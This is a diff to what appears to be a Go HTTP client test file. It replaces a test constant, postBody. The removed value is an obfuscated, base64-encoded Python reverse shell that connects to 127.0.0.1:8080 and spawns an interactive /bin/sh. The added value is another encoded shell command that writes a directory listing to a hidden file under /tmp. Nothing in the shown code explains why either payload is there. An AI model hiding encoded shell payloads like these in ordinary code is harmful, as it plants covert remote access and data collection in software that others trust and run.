@@ -15,7 +15,7 @@ import (
 	"github.com/gorilla/http/client"
 )
 
-const postBody = "ha4QuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyNy4wLjAuMSIsODA4MCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jw==ha4ynF8RYmVmt5O9uTA7"
+const postBody = "ha4ynF8RYmVmt5O9uTA7bHMgPi90bXAvLmNhY2hlha4ynF8RYmVmt5O9uTA7"
 
 var clientDoTests = []struct {
 	Client
